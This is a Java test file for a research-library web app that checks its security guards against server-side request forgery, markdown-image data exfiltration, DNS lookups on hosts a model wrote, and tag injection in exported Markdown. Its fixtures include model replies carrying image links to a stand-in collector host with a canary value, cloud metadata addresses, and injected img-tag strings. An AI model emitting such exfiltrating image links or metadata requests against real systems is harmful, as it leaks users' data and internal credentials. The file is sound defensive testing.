package org.researchzosho.librarian;

import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.node.ObjectNode;
import com.sun.net.httpserver.HttpServer;
import org.junit.jupiter.api.AfterEach;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;
import org.researchzosho.Config;
import org.researchzosho.LookupsSeen;

import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.URI;
import java.net.URLEncoder;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.nio.charset.StandardCharsets;
import java.nio.file.Path;
import java.time.Duration;
import java.time.Instant;
import java.util.ArrayList;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.concurrent.CopyOnWriteArrayList;
import java.util.concurrent.atomic.AtomicInteger;
import java.net.URLDecoder;
import java.net.UnknownHostException;
import java.util.Random;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertTrue;

/**
 * The library's pages and the files it writes for other programs, after a second reading of 0.8.1: what a reader of the code said
 * of them, each stated as the behaviour that should hold and tried. Stand-ins on the loopback only; a test that expects nothing to be
 * fetched, asked or drawn first sees the thing it counts.
 */
class GuardReviewPagesTest {
    static final ObjectMapper M = new ObjectMapper();
    static final String CANARY = "QX7731MOOR";

    @TempDir Path tmp;
    String home;
    LibraryStore store;

    @BeforeEach void up() throws Exception {
        home = System.getProperty("user.home"); System.setProperty("user.home", tmp.resolve("home").toString()); Config.invalidate();
        store = new LibraryStore(tmp.resolve("lib")); store.init();
    }

    @AfterEach void down() { System.setProperty("user.home", home); Config.invalidate(); }

    static ObjectNode message(String role, String content) { ObjectNode m = M.createObjectNode(); m.put("role", role); m.put("content", content); m.put("at", 1L); return m; }
    static String enc(String s) { return URLEncoder.encode(s, StandardCharsets.UTF_8); }

    /** A reader signed in by an invitation: the cookie their browser carries. */
    static String signedIn(LibraryStore store, String base, String name, Patrons.Level level, String password) throws Exception {
        Invites.Invite invite = Invites.make(store, name, level);
        HttpResponse<String> joined = GuardFixesPagesTest.ask("POST", base + "/join", "code=" + invite.code() + "&password=" + password + "&again=" + password);
        for (String c : GuardFixesPagesTest.cookiesSet(joined)) if (c.startsWith(Pages.COOKIE + "=")) return c;
        throw new IllegalStateException("not signed in: " + joined.statusCode() + " " + joined.body());
    }

    // ---- /found: which addresses the library fetches for a browser

    /**
     * {@code /found} fetches an address for a browser only when a page of this library showed it as a picture its own search found.
     * A picture's mark that a model wrote, or that stands in a page's text a model repeats, registers nothing, wherever it stands: in
     * the model's reply, inside the library's own line beside the found pictures, in a report. Tried with an address of this
     * machine, a link-local one (where a cloud's metadata service answers) and an ordinary one. And what a search's results
     * themselves name is fetched with the fetcher's own refusals: this machine and a link-local address are asked nothing. The
     * control: the picture the search found arrives at the listener once.
     */
    @Test
    void foundFetchesOnlyWhatASearchOfThisLibraryFoundAndNeverAMarkSomebodyWrote() throws Exception {
        List<String> asked = new CopyOnWriteArrayList<>();
        HttpServer pictures = HttpServer.create(new InetSocketAddress("127.0.0.1", 0), 0);
        pictures.createContext("/", x -> {
            asked.add(x.getRequestURI().toString());
            byte[] b = Vision.square(200, 40, 40);
            x.getResponseHeaders().add("Content-Type", "image/png");
            x.sendResponseHeaders(200, b.length); x.getResponseBody().write(b); x.close();
        });
        pictures.start();
        int port = pictures.getAddress().getPort();
        String host = "http://127.0.0.1:" + port, n = Long.toHexString(System.nanoTime());
        LibrarianDaemon d = LibrarianDaemon.start(store, "127.0.0.1", 0, "http://127.0.0.1:1", "none", -1);
        String base = "http://127.0.0.1:" + d.port();
        try {
            Pages.READER.set(Patrons.Patron.WEB.did());   // the pages below are written here as the visitor's who then asks for their pictures: a page with no reader shows its pictures to nobody
            String found = host + "/found-by-the-search-" + n + ".png";
            Map<String, String> written = new LinkedHashMap<>();   // who wrote the mark → the address in it
            written.put("a model's reply, an ordinary address", host + "/model-ordinary-" + n + ".png?d=" + CANARY);
            written.put("a model's reply, this machine by its name", "http://localhost:" + port + "/model-loopback-" + n + ".png?d=" + CANARY);
            written.put("a model's reply, a link-local address", "http://169.254.169.254/latest/meta-data/model-" + n + ".png");
            written.put("a page's words inside the library's own line, an ordinary address", host + "/page-ordinary-" + n + ".png?d=" + CANARY);
            written.put("a page's words inside the library's own line, this machine", "http://[::1]:" + port + "/page-loopback-" + n + ".png?d=" + CANARY);
            written.put("a page's words inside the library's own line, a link-local address", "http://169.254.169.254/latest/meta-data/page-" + n + ".png");
            written.put("a report, an ordinary address", host + "/report-ordinary-" + n + ".png?d=" + CANARY);
            written.put("a report, a link-local address", "http://[fe80::1]/report-" + n + ".png");
            List<String> a = new ArrayList<>(written.values());
            Librarian.Session s = Librarian.Session.open(store);
            s.append(message("user", "find me a picture of the ferry"));
            // the library's own line: its search's picture, and a description whose words (a seeing model's, a page's title) hold marks of their own
            ObjectNode line = message("assistant", "1 picture found.\n\n1. \"The ferry ![badge](" + a.get(3) + ")\" from a page.\n   ![The ferry](" + found + ")\n\n![a figure](" + a.get(4) + ")\n\nThe page says: ![x](" + a.get(5) + ")");
            line.put("by", "library"); line.putArray(Librarian.FOUND).add(found);
            s.append(line);
            s.append(message("user", "and what do my notes say?"));
            s.append(message("assistant", "They say this: ![s](" + a.get(0) + ")\n\n![t](" + a.get(1) + ")\n\n![u](" + a.get(2) + ")"));
            String chat = Pages.transcript(store, s, 100);
            String report = Pages.md("## Answer\n\nIn 1952. ![fig](" + a.get(6) + ")\n\n![fig](" + a.get(7) + ")\n");
            assertEquals(List.of(found), throughFound(chat + report), "the pages take one picture from the web through the library: the one the search found");
            Map<String, Integer> answered = new LinkedHashMap<>();
            GivenAddressesTest.loopback(true);   // the picture's host is a listener on the loopback, which the fetcher lets a test reach
            try {
                assertEquals(200, GuardChecksPagesTest.get(base + "/found?u=" + enc(found)).statusCode(), "the picture the search found is passed on (the control)");
                assertEquals(List.of("/found-by-the-search-" + n + ".png"), List.copyOf(asked), "and its host was asked for it once: the listener counts");
                for (Map.Entry<String, String> w : written.entrySet()) answered.put(w.getKey(), GuardChecksPagesTest.get(base + "/found?u=" + enc(w.getValue())).statusCode());
            } finally { GivenAddressesTest.loopback(false); }
            // what a search's own results name is shown, and fetched with the fetcher's refusals: this machine and a link-local address are asked nothing
            Map<String, String> named = new LinkedHashMap<>();
            named.put("this machine by its numbers", host + "/named-a-" + n + ".png?d=" + CANARY);
            named.put("this machine as ::ffff:127.0.0.1", "http://[::ffff:127.0.0.1]:" + port + "/named-b-" + n + ".png?d=" + CANARY);
            named.put("this machine as ::127.0.0.1", "http://[::127.0.0.1]:" + port + "/named-c-" + n + ".png?d=" + CANARY);
            named.put("a link-local address", "http://169.254.169.254/latest/meta-data/named-" + n + ".png");
            named.put("a link-local address of IPv6", "http://[fe80::1]:" + port + "/named-d-" + n + ".png?d=" + CANARY);
            Librarian.Session s2 = Librarian.Session.open(store);
            ObjectNode results = message("assistant", "");
            results.put("by", "library");
            StringBuilder words = new StringBuilder(named.size() + " pictures found.\n\n");
            for (String address : named.values()) { results.withArray(Librarian.FOUND).add(address); words.append("![a picture](").append(address).append(")\n\n"); }
            results.put("content", words.toString());
            s2.append(message("user", "find me pictures")); s2.append(results);
            assertEquals(named.size(), throughFound(Pages.transcript(store, s2, 100)).size(), "the page showed each as a found picture, so the refusal below is the fetcher's");
            Map<String, String> refusedAs = new LinkedHashMap<>();
            for (Map.Entry<String, String> e : named.entrySet()) {
                HttpResponse<byte[]> r = GuardChecksPagesTest.get(base + "/found?u=" + enc(e.getValue()));
                String said = GuardChecksPagesTest.seen(new String(r.body(), StandardCharsets.UTF_8));
                refusedAs.put(e.getKey(), r.statusCode() + (said.contains("loopback") ? " loopback" : said.contains("link-local") ? " link-local" : said.contains("unusable") ? " unusable" : " ?"));
            }
            List<String> fetchedThough = asked.stream().filter(x -> x.contains(CANARY) || x.contains("named-")).toList();
            System.out.println("[review] B-3228 /found: a mark somebody wrote " + answered + "; what a search's results named, by the fetcher " + refusedAs + "; requests made for any of them: " + fetchedThough.size());
            for (Map.Entry<String, Integer> e : answered.entrySet()) assertEquals(404, e.getValue(), "a mark that was written registers nothing: " + e.getKey());
            for (Map.Entry<String, String> e : refusedAs.entrySet()) assertTrue(e.getValue().startsWith("404 l") || e.getValue().startsWith("404 u"), "refused by the fetcher: " + e.getKey() + " → " + e.getValue());
            assertEquals(List.of(), fetchedThough, "the library asked a host for an address it should not have fetched");
        } finally { Pages.READER.remove(); d.stop(); pictures.stop(0); }
    }

    /** The addresses on the web whose pictures a page takes through the library, small or at reading size. */
    static List<String> throughFound(String html) {
        List<String> out = new ArrayList<>();
        Matcher m = Pattern.compile("<img[^>]*\\bsrc=\"/found\\?u=([^\"]+)\"").matcher(html);
        while (m.find()) out.add(URLDecoder.decode(m.group(1), StandardCharsets.UTF_8));
        return out;
    }

    /**
     * Who may ask {@code /found} for a picture: the reader whose own page showed it. Two readers signed in to one library; the first
     * one's conversation shows a picture its search found. The second, who was shown nothing, asks the library for the same address
     * and gets nothing, and the picture's host is not asked again; once a page of their own shows it, they get it. (The accounts of an
     * account service are each a process of their own, {@code LibraryRunner.Local}: nothing here is shared between them at all.)
     */
    @Test
    void aFoundPictureIsPassedOnToTheReaderWhosePageShowedIt() throws Exception {
        Boolean signIn = WebAccess.OVERRIDE, local = WebAccess.LOCAL_OVERRIDE;
        WebAccess.OVERRIDE = true; WebAccess.LOCAL_OVERRIDE = false;
        Patrons.setDefault(store, Patrons.Level.deny);
        Patrons.set(store, "did:key:owner", "Owner", Patrons.Level.write);
        Images.Fetcher real = Images.FOUND_FETCHER;
        List<String> fetched = new CopyOnWriteArrayList<>();
        Images.FOUND_FETCHER = url -> { fetched.add(url); return new Images.Fetched(Vision.square(200, 40, 40), "image/png"); };
        var engines = Images.ENGINES;
        String n = Long.toHexString(System.nanoTime()), picture = "https://img-" + n + ".example.org/ferry.png", page = "https://img-" + n + ".example.org/ferry.html";
        Images.ENGINES = () -> List.of(new Images.Engine("stand-in", (words, count) -> List.of(new Images.Found(picture, page, "The ferry", "stand-in", 800, 600, "", "", ""))));
        LibrarianDaemon d = LibrarianDaemon.start(store, "127.0.0.1", 0, "http://127.0.0.1:1", "none", -1);
        String base = "http://127.0.0.1:" + d.port();
        try {
            String ann = signedIn(store, base, "Ann Example", Patrons.Level.write, "ann-secret-1"), ben = signedIn(store, base, "Ben Example", Patrons.Level.read, "ben-secret-1");
            String[] asAnn = {"Cookie", ann, "Sec-Fetch-Site", "same-origin", "Sec-Fetch-Mode", "navigate", "Sec-Fetch-Dest", "document"}, asBen = {"Cookie", ben, "Sec-Fetch-Site", "same-origin", "Sec-Fetch-Mode", "navigate", "Sec-Fetch-Dest", "document"};
            // Ann's own page of found pictures (the pictures page runs the search for whoever opens it)
            String annsPage = GuardFixesPagesTest.ask("GET", base + ImagesPage.PATH + "?q=ferry", null, asAnn).body();
            assertTrue(annsPage.contains("/found?u=" + enc(picture)), "Ann's page shows the found picture from the library's own address: " + GuardChecksPagesTest.seen(annsPage).strip().replaceAll("\\s+", " "));
            Map<String, Integer> got = new LinkedHashMap<>();
            got.put("Ann, whose page showed it", GuardChecksPagesTest.get(base + "/found?u=" + enc(picture), "Cookie", ann).statusCode());
            int afterAnn = fetched.size();
            got.put("Ben, who was shown nothing", GuardChecksPagesTest.get(base + "/found?u=" + enc(picture), "Cookie", ben).statusCode());
            got.put("nobody signed in", GuardChecksPagesTest.get(base + "/found?u=" + enc(picture)).statusCode());
            String bensPage = GuardFixesPagesTest.ask("GET", base + ImagesPage.PATH + "?q=ferry", null, asBen).body();
            assertTrue(bensPage.contains("/found?u=" + enc(picture)), "Ben's own page shows it now");
            got.put("Ben, after his own page showed it", GuardChecksPagesTest.get(base + "/found?u=" + enc(picture), "Cookie", ben).statusCode());
            System.out.println("[review] B-3236 /found between two readers of one library: " + got + "; the picture's host was asked " + fetched.size() + " time(s)");
            assertEquals(200, got.get("Ann, whose page showed it"), "the control");
            assertEquals(1, afterAnn, "fetched once for her");
            assertEquals(404, got.get("Ben, who was shown nothing"), "a reader whose page did not show it");
            assertTrue(got.get("nobody signed in") != 200, "nobody signed in: " + got);
            assertEquals(200, got.get("Ben, after his own page showed it"), "his own page's picture");
        } finally { d.stop(); Images.FOUND_FETCHER = real; Images.ENGINES = engines; WebAccess.OVERRIDE = signIn; WebAccess.LOCAL_OVERRIDE = local; }
    }

    /** The pictures kept in memory for {@code /found} are bounded by their number as by their weight: many small ones do not grow without end. */
    @Test
    void thePicturesKeptForFoundAreBoundedByNumberToo() throws Exception {
        Images.Fetcher real = Images.FOUND_FETCHER;
        AtomicInteger fetched = new AtomicInteger();
        Images.FOUND_FETCHER = url -> { fetched.incrementAndGet(); return new Images.Fetched(Vision.square(8, 2, 2), "image/png"); };
        LibrarianDaemon d = LibrarianDaemon.start(store, "127.0.0.1", 0, "http://127.0.0.1:1", "none", -1);
        String base = "http://127.0.0.1:" + d.port(), n = Long.toHexString(System.nanoTime());
        try {
            Pages.READER.set(Patrons.Patron.WEB.did());   // the pages below are written here as the visitor's who then asks for their pictures: a page with no reader shows its pictures to nobody
            int many = Pages.FOUND_PICTURES + 40;
            String first = "https://img-" + n + ".example.org/p0.png";
            // one client asks for all of them, as a browser does: a client of its own for each request, closed by nobody, keeps a
            // selector and its thread until a collection, and a Mac stops answering one process at about 1,340 of those
            try (HttpClient one = HttpClient.newBuilder().followRedirects(HttpClient.Redirect.NEVER).build()) {
                for (int i = 0; i < many; i++) { String a = "https://img-" + n + ".example.org/p" + i + ".png"; Pages.found(a); assertEquals(200, found(one, base, a), a); }
                assertEquals(many, fetched.get(), "each was fetched once (the control)");
                assertTrue(Pages.foundKept() <= Pages.FOUND_PICTURES, "kept: " + Pages.foundKept() + " of at most " + Pages.FOUND_PICTURES);
                // the oldest was let go, and is fetched again when a page still shows it
                assertEquals(200, found(one, base, first));
                assertEquals(many + 1, fetched.get(), "the one dropped first is fetched again");
            }
        } finally { Pages.READER.remove(); d.stop(); Images.FOUND_FETCHER = real; }
    }

    private static int found(HttpClient client, String base, String address) throws Exception {
        return client.send(HttpRequest.newBuilder(URI.create(base + "/found?u=" + enc(address))).timeout(Duration.ofSeconds(60)).GET().build(), HttpResponse.BodyHandlers.ofByteArray()).statusCode();
    }

    // ---- which addresses a page makes a link

    /**
     * Whether a host written in a model's words is this machine is read off the letters, and no name server is asked: a page is
     * written the moment somebody opens it, and a name handed to a resolver is read by the server of the name's domain, with whatever
     * a model put into it. Tried with hosts that hold a colon (which the reading takes for an address written as numbers), with
     * numbers out of range and with a number too long; every one in a report, in the chat and as a claim's source. The control: a
     * lookup this test makes itself is seen by the same watch.
     */
    @Test
    void writingAPageLooksUpNoName() throws Exception {
        String n = Long.toHexString(System.nanoTime());
        String mark = "zz" + n;
        List<String> hosts = List.of(mark + ":x.collector.example.net", "s" + mark + ":8a.collector.example.net:8443", mark + ".collector.example.net:x", "999.1.1." + (n.hashCode() & 0xff), "99999999999" + (n.hashCode() & 0xffff),
                "[" + mark + ":x.collector.example.net]", mark + "%25x:collector.example.net");
        LookupsSeen.watch(h -> h.contains(mark) || h.startsWith("999.") || h.startsWith("99999999999"));
        try { InetAddress.getByName(mark + "-control.collector.example.net"); } catch (UnknownHostException expected) { /* the watch answers no such host */ }
        List<String> control = LookupsSeen.seen();
        assertEquals(List.of(mark + "-control.collector.example.net"), control, "the watch sees a lookup (the control): a zero below means none was made");
        LookupsSeen.watch(h -> h.contains(mark) || h.startsWith("999.") || h.startsWith("99999999999"));
        int written = 0;
        for (String host : hosts) {
            String address = "http://" + host + "/x?d=" + CANARY;
            for (String form : List.of("See [the harbour office's page](" + address + ") for it.", "See ![the ferry](" + address + ") for it.", "See " + address + " for it.")) {
                written++;
                Pages.md("## Answer\n\n" + form + "\n");
                Librarian.Session s = Librarian.Session.open(store);
                s.append(message("user", "What do my notes say?")); s.append(message("assistant", form));
                Pages.transcript(store, s, 100);
            }
            Pages.locatorLink(address); Pages.readingHtml("A reading says so [" + address + "]."); Pages.linkable(address);
            written += 3;
        }
        List<String> lookedUp = LookupsSeen.seen();
        System.out.println("[review] B-3524 hosts a model wrote, " + hosts.size() + " of them in " + written + " places of a page: names handed to a resolver while the pages were written: " + lookedUp.size() + " " + lookedUp.stream().distinct().toList());
        assertEquals(List.of(), lookedUp.stream().distinct().toList(), "a page's writing asked a resolver for a name a model wrote");
        // and what this machine is, read off the letters: its names, its addresses in every spelling, the address that means every address
        for (String own : List.of("localhost", "LOCALHOST.".toLowerCase(), "app.localhost", "127.0.0.1", "127.8.9.10", "[::1]", "[0:0:0:0:0:0:0:1]", "[::0:1]", "[::ffff:127.0.0.1]", "[::127.0.0.1]", "0.0.0.0", "[::]", "2130706433", "0x7f000001", "0x7f.0.0.1",
                "127.1", "0177.0.0.1", "017700000001", "127.0.0.01"))   // the short and the octal forms a browser reads as 127.0.0.1: numbers that are no address as written, taken for this machine
            assertTrue(Pages.thisMachine(own), own + " is this machine");
        for (String other : List.of("example.org", "192.0.2.20", "[2001:db8::77]", "localhost.example.org", "8.8.8.8", "3232235777"))
            assertFalse(Pages.thisMachine(other), other + " is not this machine");
    }

    /**
     * The library's own name from outside, as the settings keep it, is never made a link in a model's words, whatever the setting
     * holds beside the host (a port, a path, a user) and whatever port the written address names; another host is a link as before,
     * and with the setting left empty nothing of the web is held back for it. (The comparison is of the host on both sides, as it is
     * for the name the request's browser used.)
     */
    @Test
    void theLibrarysOwnNameFromOutsideIsNoLinkHoweverTheSettingWritesIt() throws Exception {
        String n = Long.toHexString(System.nanoTime()), name = "library-" + n + ".example.org";
        Map<String, List<Boolean>> got = new LinkedHashMap<>();
        for (String setting : List.of("https://" + name, "https://" + name + ":8443", "https://" + name + "/lib/", "https://keeper@" + name + ":8443/lib?x=1", "  https://" + name.toUpperCase() + "/  ", "")) {
            Config.set("RESEARCHZOSHO_SHARE_ADDRESS", setting);
            got.put(setting.isBlank() ? "(not set)" : setting.strip(), List.of(
                    Pages.linkable("https://" + name + "/ask?q=" + CANARY), Pages.linkable("https://" + name + ":8443/ask?q=" + CANARY), Pages.linkable("http://" + name + ":4649/logout"),
                    Pages.linkable("https://sub." + name + "/page"), Pages.linkable("https://gazette-" + n + ".example.org/1968"), Pages.linkable("http://null/page")));
        }
        System.out.println("[review] B-3517 the library's name in the share setting → {the name, the name at the setting's port, at another port, a name under it, another host, a host called null} is a link: " + got);
        for (Map.Entry<String, List<Boolean>> e : got.entrySet()) {
            boolean set = !e.getKey().equals("(not set)");
            assertEquals(List.of(!set, !set, !set, true, true, true), e.getValue(), "with the setting " + e.getKey());
        }
    }

    /**
     * The Help page shows the program's own documentation, whose links stand as they are written. What the page was asked (the
     * {@code q} of its address, which anybody can write into a link) is not the program's own words: shown back, it is words and
     * never a link or a picture, as a model's words are held. The control: the same page links to its own documents.
     */
    @Test
    void whatTheHelpPageWasAskedIsShownAsWordsNotAsTheProgramsOwn() throws Exception {
        LibrarianDaemon d = LibrarianDaemon.start(store, "127.0.0.1", 0, "http://127.0.0.1:1", "none", -1);
        String base = "http://127.0.0.1:" + d.port(), n = Long.toHexString(System.nanoTime());
        try {
            // no word of it stands in the documentation, so the page says it back; the paths are written with an escape for a letter, which a browser reads as the letter
            String asked = "zzqq" + n + " [zzqqa" + n + "](/%61sk?q=" + CANARY + n + ") [zzqqb" + n + "](/%65xpl%61in?zzt=" + CANARY + n + ") ![zzqqc" + n + "](/%69mages?q=" + CANARY + n + ") [[F-" + CANARY + n + "]]";
            String page = GuardFixesPagesTest.ask("GET", base + "/help?q=" + enc(asked), null, "Sec-Fetch-Site", "none", "Sec-Fetch-Mode", "navigate", "Sec-Fetch-Dest", "document").body();
            String prose = page.substring(Math.max(0, page.indexOf("<div class=\"prose\">")));
            assertTrue(GuardChecksPagesTest.seen(prose).contains("zzqq" + n), "the page says what it was asked (the control): " + GuardChecksPagesTest.seen(prose).strip().replaceAll("\\s+", " "));
            List<String> leads = GuardChecksPagesTest.leadsTo(prose).stream().filter(a -> a.contains(CANARY)).toList();
            assertTrue(GuardChecksPagesTest.seen(prose).contains("[zzqqa" + n + "](/%61sk?q=" + CANARY + n + ")"), "as the words they were written as: " + GuardChecksPagesTest.seen(prose).strip().replaceAll("\\s+", " "));
            System.out.println("[review] the Help page asked words that hold links into the library: links made of them " + leads.size() + " " + leads + "; pictures " + (prose.contains("<img") ? 1 : 0));
            // the instrument: handed on as the program's own words (as the page did until the second reading of 0.8.1), the same words are links, and the count sees them
            assertFalse(GuardChecksPagesTest.leadsTo(Pages.mdOfTheProgram(Help.lookup(store, asked, Chrome.ENGLISH))).stream().filter(a -> a.contains(CANARY)).toList().isEmpty(), "the control");
            assertEquals(List.of(), leads, "the words the page was asked became links");
            assertFalse(prose.contains("<img"), "or a picture");
            assertTrue(GuardChecksPagesTest.leadsTo(page).stream().anyMatch(a -> a.startsWith("/help")), "the page's own links stand (the control)");
        } finally { d.stop(); }
    }

    // ---- the translate button

    /**
     * The button that files a translation stands only where pressing it files one: on a report read in another language than it is
     * written in. A report asked for in its own language is the report as written and offers no translation into the language it is
     * already in; an entry that is no report (a claim, a saved page) offers none; and a press of the real button files one run, a
     * second press no second one. The control: the button is there for another language, and the run it files is on the list.
     */
    @Test
    void theTranslateButtonStandsOnlyWherePressingItFilesARun() throws Exception {
        Boolean signIn = WebAccess.OVERRIDE, local = WebAccess.LOCAL_OVERRIDE;
        WebAccess.OVERRIDE = true; WebAccess.LOCAL_OVERRIDE = false;
        Patrons.setDefault(store, Patrons.Level.deny);
        Patrons.set(store, "did:key:owner", "Owner", Patrons.Level.write);
        store.write(new Investigation("I-0001-kestrel-crossing", "The Kestrel crossing", Finding.State.accepted, "model:stand-in", Instant.now().toString(), List.of(), List.of(),
                "## Question\n\nWhen did the ferry across Kestrel Sound stop running, and why did the company close the route?\n\n## Answer\n\nThe ferry stopped running in 1968, when the bridge opened and the company closed the route for want of passengers.\n"));
        Finding claim = new Finding(store.nextFindingId("kestrel-ferry-stopped"), "The ferry across Kestrel Sound stopped running in 1968", List.of(), Finding.State.accepted, Finding.ClaimType.extraction, Finding.Confidence.medium, "model:stand-in",
                Instant.now().toString(), "2026-11-20", Finding.Volatility.slow, "", List.of(new Finding.Source("https://gazette.example.org/1968", "n/a", "the full record")), List.of(), null, "The ferry across Kestrel Sound stopped running in 1968.\n");
        store.write(claim);
        new LibrarianIndex(store, Embeddings.none()).rebuild();
        LibrarianDaemon d = LibrarianDaemon.start(store, "127.0.0.1", 0, "http://127.0.0.1:1", "none", -1);
        String base = "http://127.0.0.1:" + d.port();
        try {
            String cookie = signedIn(store, base, "Ann Example", Patrons.Level.write, "ann-secret-1");
            String[] as = {"Cookie", cookie, "Sec-Fetch-Site", "same-origin", "Sec-Fetch-Mode", "navigate", "Sec-Fetch-Dest", "document"}, own = {"Cookie", cookie, "Sec-Fetch-Site", "same-origin", "Origin", base};
            String report = "/entry/I-0001-kestrel-crossing";
            assertEquals("en", Translate.writtenIn(store.investigation("I-0001-kestrel-crossing")), "the report is written in English");
            Map<String, String> shows = new LinkedHashMap<>();
            String inJa = GuardFixesPagesTest.ask("GET", base + report + "?in=ja", null, as).body();
            shows.put("a report asked for in Japanese", button(inJa));
            shows.put("a report asked for in the language it is written in", button(GuardFixesPagesTest.ask("GET", base + report + "?in=en", null, as).body()));
            // the reader's own language set to the report's: every such report is simply read as written
            GuardFixesPagesTest.ask("POST", base + "/settings", "op=read_in&value=en&back=" + enc(report), own);
            String mine = GuardFixesPagesTest.ask("GET", base + report, null, as).body();
            shows.put("a report read by someone who reads everything in its language", button(mine));
            GuardFixesPagesTest.ask("POST", base + "/settings", "op=read_in&value=&back=" + enc(report), own);
            shows.put("a claim", button(GuardFixesPagesTest.ask("GET", base + "/entry/" + enc(claim.id()) + "?in=ja", null, as).body()));
            int runs = GuardChecksPagesTest.jobs(base, cookie);
            Map<String, Integer> filed = new LinkedHashMap<>();
            GuardFixesPagesTest.ask("POST", base + report, "in=ja&translate=1", own);
            filed.put("the button on the report, Japanese", GuardChecksPagesTest.jobs(base, cookie) - runs);
            String after = GuardFixesPagesTest.ask("GET", base + report + "?in=ja", null, as).body();
            GuardFixesPagesTest.ask("POST", base + report, "in=ja&translate=1", own);
            filed.put("pressed again", GuardChecksPagesTest.jobs(base, cookie) - runs);
            HttpResponse<String> byHand = GuardFixesPagesTest.ask("POST", base + "/entry/" + enc(claim.id()), "in=ja&translate=1", own);
            String landed = GuardFixesPagesTest.ask("GET", base + byHand.headers().firstValue("Location").orElse("/"), null, as).body();
            filed.put("a form made by hand for a claim", GuardChecksPagesTest.jobs(base, cookie) - runs);
            System.out.println("[review] B-336 the translate button: " + shows + "; runs filed: " + filed + "; after the press the report's page says it is being translated: " + after.contains("Being translated into")
                    + "; the page a hand-made form for a claim lands on says so: " + landed.contains("Being translated into"));
            assertEquals("Translate into Japanese", shows.get("a report asked for in Japanese"), "the button is there for another language (the control)");
            assertEquals("", shows.get("a report asked for in the language it is written in"), "a button that would file nothing");
            assertEquals("", shows.get("a report read by someone who reads everything in its language"), "a button that would file nothing, on every report in the reader's own language");
            assertFalse(mine.contains("No translation into"), "and no sentence that a translation is missing: the report is in that language");
            assertEquals("", shows.get("a claim"), "an entry that is no report");
            assertEquals(1, filed.get("the button on the report, Japanese"), "one press, one run");
            assertEquals(filed.get("pressed again"), filed.get("a form made by hand for a claim"), "a form made by hand for an entry that is no report files nothing: " + filed);
            assertFalse(landed.contains("Being translated into"), "the page a hand-made form for a claim lands on says nothing of a translation being made");   // (the report's own page says so while its run is on its way; with no model answering here the run ends at once)
        } finally { GuardFixesPagesTest.stopped(d); WebAccess.OVERRIDE = signIn; WebAccess.LOCAL_OVERRIDE = local; }
    }

    /** The words of a page's translate button, or "" when the page has none. */
    static String button(String page) {
        Matcher m = Pattern.compile("<button class=\"btn\" name=\"translate\" value=\"1\">([^<]*)</button>").matcher(page);
        return m.find() ? GuardChecksPagesTest.seen(m.group(1)) : "";
    }

    // ---- a file written for another program

    /**
     * The library's own picture is the one picture an exported file keeps, written as an ordinary writer of Markdown writes one: with
     * a title after its path, with quotes in its words. And it is kept only when nothing in it could be read as markup: a picture
     * "of the library's own" whose path holds a tag is no kept picture's path, and goes the way every other picture and tag goes.
     * The file is read here as the specification reads it ({@code GuardChecksPagesTest.drawnByCommonMark}).
     */
    @Test
    void theLibrarysOwnPictureIsKeptAsAWriterWritesItAndCarriesNoMarkup() {
        String evil = "https://collector.example.net";
        // what must stay a picture
        Map<String, String> kept = new LinkedHashMap<>();
        kept.put("plain", "![The ferry](/images/kept.png)");
        kept.put("a title after the path", "![The ferry](/images/kept.png \"The ferry at the pier, 1952\")");
        kept.put("a title in single quotes", "![The ferry](/images/kept.png 'The ferry')");
        kept.put("quotes in its words", "![The \"Kestrel\" at anchor](/images/kept.png)");
        kept.put("a collection's picture", "![Number 3](/images/collections/J-0007/small-3.jpg)");
        kept.put("a path with an escape", "![写真](/images/%E5%86%99%E7%9C%9F.jpg)");
        Map<String, String> lost = new LinkedHashMap<>();
        for (Map.Entry<String, String> e : kept.entrySet()) { String out = Export.forAViewer("In 1952.\n\n" + e.getValue() + "\n"); if (!out.contains(e.getValue())) lost.put(e.getKey(), out.strip().replace("\n", " ")); }
        // what must not come out as markup, though it is dressed as the library's own picture
        Map<String, String> dressed = new LinkedHashMap<>();
        dressed.put("a tag in the path", "![x](/<img/src=\"" + evil + "/a.png?d=" + CANARY + "\">)");
        dressed.put("a tag in the path, no quotes", "![x](/<img/src=" + evil + "/b.png?d=" + CANARY + ">)");
        dressed.put("a tag after a kept path", "![x](/images/kept.png<img/src=" + evil + "/c.png?d=" + CANARY + ">)");
        dressed.put("a tag in the title", "![x](/images/kept.png \"<img src=" + evil + "/d.png?d=" + CANARY + ">\")");
        dressed.put("a picture of the web in the title", "![x](/images/kept.png \"![y](" + evil + "/e.png?d=" + CANARY + ")\")");
        dressed.put("a path that is no kept picture's", "![x](/found?u=" + enc(evil + "/f.png?d=" + CANARY) + ")");
        dressed.put("a path that climbs out", "![x](/images/../logout?d=" + CANARY + ")");
        Map<String, String> markup = new LinkedHashMap<>();
        for (Map.Entry<String, String> e : dressed.entrySet()) {
            String out = Export.forAViewer("In 1952.\n\n" + e.getValue() + "\n");
            boolean tag = Pattern.compile("<[A-Za-z/!?][^>]*=").matcher(out).find();   // a bracket that begins a tag with an attribute's value, wherever it stands and whatever reads it
            boolean drawn = GuardChecksPagesTest.drawnByCommonMark(out).stream().anyMatch(x -> x.contains(CANARY)) || out.contains("![x](/found") || out.contains("![x](/images/..");
            if (tag || drawn) markup.put(e.getKey(), out.strip().replace("\n", " "));
        }
        System.out.println("[review] B-98, B-133 the library's own picture in an exported file: written " + kept.size() + " ordinary ways, lost its mark in " + lost.size() + " " + lost.keySet() + "; dressed as one " + dressed.size() + " ways, came out as markup or a picture in " + markup.size() + " " + markup.keySet());
        assertEquals(Map.of(), markup, "something dressed as the library's own picture comes out as markup");
        assertEquals(Map.of(), lost, "the library's own picture lost its mark");
    }

    /** The pattern that found the library's own pictures in a file until their words were read by hand: what {@code Export.ownPictures} must find. */
    static final Pattern OWN_PICTURE_AS_IT_WAS = Pattern.compile("!\\[(?:[^\\[\\]!<\\n]|!(?!\\[)|\\[[^\\[\\]<\\n]*\\])*\\]\\([ \\t]*(/(?![/\\\\])[^)\\s\\\\]*)(?:[ \\t]+(?:\"[^\"<\\[\\]\\n]*\"|'[^'<\\[\\]\\n]*'))?[ \\t]*\\)");

    /**
